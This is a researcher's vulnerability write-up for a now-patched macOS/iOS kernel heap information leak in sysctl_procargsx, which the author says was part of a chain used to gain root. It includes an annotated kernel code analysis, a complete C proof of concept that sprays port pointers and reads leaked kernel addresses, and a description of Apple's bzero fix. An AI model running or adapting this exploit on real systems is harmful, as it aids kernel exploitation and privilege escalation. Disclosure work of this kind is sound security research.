---
layout: default
author: juwei lin
date: 2018-11-13 15:16:00 +0800
---


# Description
sysctl_procargsx in bsd has a wrong logic about retrieve user stack information. We can craft a request with size < p->p_argslen (e.g. 0x3a8), then we get the leaked heap information.

Please be noticed that I already successfully use 3 vulnerabilities in BSD to `root` the latest public macOS `10.13.6`.  

The 3 cases are:  
* (zdi-rcx15) necp arbitrary address write case.
* (zdi-rcx16) necp arbitrary address free case.
* `(zdi-rcx17) progargsx heap leak case.` 

# Environment
* OS: 		    macOS 10.13.6， iOS 11.4 
* Module:	    BSD

# Analysis
sysctl_procargsx function has a bug of copyout process args information.

```
STATIC int
sysctl_procargsx(int *name, u_int namelen, user_addr_t where, 
                 size_t *sizep, proc_t cur_proc, int argc_yes)
{
    ...


    if ((u_int)arg_size > p->p_argslen)
	    arg_size = round_page(p->p_argslen);            --- (a)

	arg_addr = p->user_stack - arg_size;


    ...


    ret = kmem_alloc(kernel_map, &copy_start, round_page(arg_size), VM_KERN_MEMORY_BSD);
	if (ret != KERN_SUCCESS) {
		vm_map_deallocate(proc_map);
		return(ENOMEM);
	}

	copy_end = round_page(copy_start + arg_size);

	if( vm_map_copyin(proc_map, (vm_map_address_t)arg_addr, 
			  (vm_map_size_t)arg_size, FALSE, &tmp) != KERN_SUCCESS) {
			vm_map_deallocate(proc_map);
			kmem_free(kernel_map, copy_start,
					round_page(arg_size));
			return (EIO);
	}

	/*
	 *	Now that we've done the copyin from the process'
	 *	map, we can release the reference to it.
	 */
	vm_map_deallocate(proc_map);

	if( vm_map_copy_overwrite(kernel_map,               --- (b)
				  (vm_map_address_t)copy_start, 
				  tmp, FALSE) != KERN_SUCCESS) {
			kmem_free(kernel_map, copy_start,
					round_page(arg_size));
			vm_map_copy_discard(tmp);
			return (EIO);
	}

	if (arg_size > argslen) {
		data = (caddr_t) (copy_end - argslen);
		size = argslen;
	} else {
		data = (caddr_t) (copy_end - arg_size);         --- (c)
		size = arg_size;
	}


    ...


	if (argc_yes) {
		/* Put processes argc as the first word in the copyout buffer */
		suword(where, argc);
		error = copyout(data, (where + sizeof(int)), size);
		size += sizeof(int);
	} else {
		error = copyout(data, where, size);             --- (d)


}
```

In the above code snippet:  
a).  p->p_argslen is usually around 0x300, and I set my arg_size to 0x200. So arg_size will not be round_page.  
b).  Stack information is copied to new allocated page at offset 0 with arg_size (0x200). The new allocated page is not zeroed. So this operation leaves the rest of this page filled with last time used data.  
c).  copy_end is round_paged, parameter `data` points to the last 0x200 bytes of the page where the data is not the needed stack args information but heap residual information.  
d).  copyout the 0x200 leaked heap information to user.

# PoC

```
#import <mach-o/loader.h>
#import <sys/mman.h>
#import <pthread.h>
#undef __IPHONE_OS_VERSION_MIN_REQUIRED
#import <mach/mach.h>
#include <sys/utsname.h>
#include <assert.h>
#include <iostream>
#include <unistd.h>
#include <sys/types.h>
#include <sys/sysctl.h>
#include <mach/mach.h>

#define kIOMasterPortDefault MACH_PORT_NULL
#define IO_OBJECT_NULL MACH_PORT_NULL
#define MACH_VOUCHER_ATTR_ATM_CREATE ((mach_voucher_attr_recipe_command_t)510)
#define IO_BITS_ACTIVE 0x80000000
#define IKOT_TASK 2
#define IKOT_IOKIT_CONNECT 29
#define IKOT_CLOCK 25

#define kr32(address, value)\
*(uint64_t*) (faketask + 0x380) = address - 0x10;\
pid_for_task(foundport, value);

typedef struct {
    mach_msg_header_t head;
    mach_msg_body_t msgh_body;
    mach_msg_ool_ports_descriptor_t desc[1];
    char pad[4096];
} sprz;

struct ipc_object {
    natural_t io_bits;
    natural_t io_references;
    char    io_lock_data[0x100];
};

struct ool_msg  {
    mach_msg_header_t hdr;
    mach_msg_body_t body;
    mach_msg_ool_ports_descriptor_t ool_ports;
};

mach_port_t mport = 0;
mach_port_t tfp0 = 0;


static mach_port_t fill_kalloc_with_port_pointer(mach_port_t target_port, int count, int disposition) {
    // allocate a port to send the message to
    mach_port_t q = MACH_PORT_NULL;
    kern_return_t err;
    err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &q);
    if (err != KERN_SUCCESS) {
        printf(" [-] failed to allocate port\n");
        exit(EXIT_FAILURE);
    }
    
    mach_port_t* ports = (mach_port_t*)malloc(sizeof(mach_port_t) * count);
    for (int i = 0; i < count; i++) {
        ports[i] = target_port;
    }
    
    struct ool_msg* msg = (ool_msg*)calloc(1, sizeof(struct ool_msg));
    
    msg->hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    msg->hdr.msgh_size = (mach_msg_size_t)sizeof(struct ool_msg);
    msg->hdr.msgh_remote_port = q;
    msg->hdr.msgh_local_port = MACH_PORT_NULL;
    msg->hdr.msgh_id = 0x41414141;
    
    msg->body.msgh_descriptor_count = 1;
    
    msg->ool_ports.address = ports;
    msg->ool_ports.count = count;
    msg->ool_ports.deallocate = 0;
    msg->ool_ports.disposition = disposition;
    msg->ool_ports.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    msg->ool_ports.copy = MACH_MSG_PHYSICAL_COPY;
    
    err = mach_msg(&msg->hdr,
                   MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
                   (mach_msg_size_t)sizeof(struct ool_msg),
                   0,
                   MACH_PORT_NULL,
                   MACH_MSG_TIMEOUT_NONE,
                   MACH_PORT_NULL);
    
    if (err != KERN_SUCCESS) {
        printf(" [-] failed to send message: %s\n", mach_error_string(err));
        exit(EXIT_FAILURE);
    }
    
    return q;
}


bool try_leak()
{
    int pid = getpid();
    int name[3] = {CTL_KERN, KERN_PROCARGS2, pid};
    uint8_t oldp[0x104] = {0};
    size_t oldplen = 0x104;
    
    sysctl(name, 3, oldp, &oldplen, NULL, 0);
    
    uint32_t p_argc = *(uint32_t*)oldp;
    //printf("argc: %d\n", p_argc);
    //printf("count: %d\n", oldplen);
    
    uint64_t* p_obj = (uint64_t*)(oldp+4);
    bool leak = true;
    
    for (int i=0; i<0x100/8; i++) {
        if ((p_obj[i] > 0xffffff0000000000 && ((p_obj[i] & 0x7) == 0)) == false) {
            //printf("0x%llx\n", p_obj[i]);
            leak = false;
            break;
        }
    }
    
    if (leak) {
        p_obj = (uint64_t*)(oldp+4);
        for (int i=0; i<0x100/8; i+=2) {
            printf("0x%llx 0x%llx\n", p_obj[i], p_obj[i+1]);
        }
    }
    
    return leak;
}

int main()
{
    int n_guesses = 0x1100;
    int leak_count = 0;
    
    for (int i = 1; i < n_guesses+1; i++) {
        printf("try id: %d\n", i);
        mach_port_t q = fill_kalloc_with_port_pointer(mach_task_self(), i, MACH_MSG_TYPE_COPY_SEND);
        mach_port_destroy(mach_task_self(), q);
        
        if (try_leak() == true)
            leak_count ++;
        
        if(leak_count > 5)
            break;
    }
    
    return 0;
}

```

PoC binary is also provided, see attched files.

# how did Apple fix this?
In 10.14.1, Apple added calling bzero.  
![heap_free_fix]({{site.url}}{{site.baseurl}}/res/heap_leak.png)  

  [Back Home]({{site.url}}{{site.baseurl}})